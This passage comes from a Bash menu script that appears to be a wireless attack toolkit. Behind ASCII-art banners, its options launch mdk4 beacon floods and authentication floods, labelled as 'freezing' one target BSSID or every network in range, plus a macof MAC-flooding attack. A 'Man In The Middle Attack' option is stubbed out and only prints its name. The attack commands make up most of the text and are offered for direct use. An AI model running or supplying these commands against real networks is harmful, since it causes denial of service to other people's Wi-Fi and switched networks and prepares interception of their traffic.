            read -e -p "$(echo -e $BOLD$BLUE"Enter Name or Bssid =>"$RESET) => " self # pathx
            echo ""
            sudo mdk4 $lan b -n $self
            elif [ $rdx == "4" ]
            then
            hello_world
            sudo mdk4 $lan b 
            else
            /home/$USER/test
            fi
######################################################################################
        elif [ $b == "5" ]    # fake
        then
        echo "
  █████▒ ██▀███   ▒█████  ▒███████▒▓█████ 
▓██   ▒ ▓██ ▒ ██▒▒██▒  ██▒▒ ▒ ▒ ▄▀░▓█   ▀ 
▒████ ░ ▓██ ░▄█ ▒▒██░  ██▒░ ▒ ▄▀▒░ ▒███   
░▓█▒  ░ ▒██▀▀█▄  ▒██   ██░  ▄▀▒   ░▒▓█  ▄ 
░▒█░    ░██▓ ▒██▒░ ████▓▒░▒███████▒░▒████▒
 ▒ ░    ░ ▒▓ ░▒▓░░ ▒░▒░▒░ ░▒▒ ▓░▒░▒░░ ▒░ ░
 ░        ░▒ ░ ▒░  ░ ▒ ▒░ ░░▒ ▒ ░ ▒ ░ ░  ░
 ░ ░      ░░   ░ ░ ░ ░ ▒  ░ ░ ░ ░ ░   ░   
           ░         ░ ░    ░ ░       ░  ░
                          ░               
" | lolcat

         echo ""
            echo -e "\e[1;35m[1]\e[0m \e[1;35m Froze a Single Network \e[0m" #purple
            echo ""
            echo -e "\e[1;35m[2]\e[0m \e[1;35m Froze Every Network In Range \e[0m" #purple
            echo ""
            read -e -p "$(echo -e $BOLD$YELLOW"Select the options"$RESET) => " fez 
            echo ""
            if [ $fez == "1" ]
            then
            hello_world
            read -e -p "$(echo -e $BOLD$BLUE"Enter Target Address =>"$RESET) => " kitten # bssid
            echo ""
            sudo mdk4 $lan a -a $kitten
            elif [ $fez == "2" ]
            then
            hello_world
            sudo mdk4 $lan a
            else
            /home/$USER/test
            fi
######################################################################################
        elif [ $b == "6" ]    # macflood
        then
        echo -e "
##\      ##\                       ######\  ##\                           ##\ 
###\    ### |                     ##  __##\ ## |                          ## |
####\  #### | ######\   #######\  ## /  \__|## | ######\   ######\   ####### |
##\##\## ## | \____##\ ##  _____| ####\     ## |##  __##\ ##  __##\ ##  __## |
## \###  ## | ####### |## /       ##  _|    ## |## /  ## |## /  ## |## /  ## |
## |\#  /## |##  __## |## |       ## |      ## |## |  ## |## |  ## |## |  ## |
## | \_/ ## |\####### |\#######\  ## |      ## |\######  |\######  |\####### |
\__|     \__| \_______| \_______| \__|      \__| \______/  \______/  \_______| " | lolcat
       sudo macof -i $lan
######################################################################################
        else
            /home/$USER/test
        fi
######################################################################################
        elif [ $b == "7" ]    #Man In The Middle Attack
        then 
        echo "Man In The Middle Attack"
######################################################################################

elif [ $Modules == "3" ]
then
hello_world
echo "module 3"

else
echo "you enter wrong keys"
wait
/home/$USER/test
fi
}
bankai_tits
done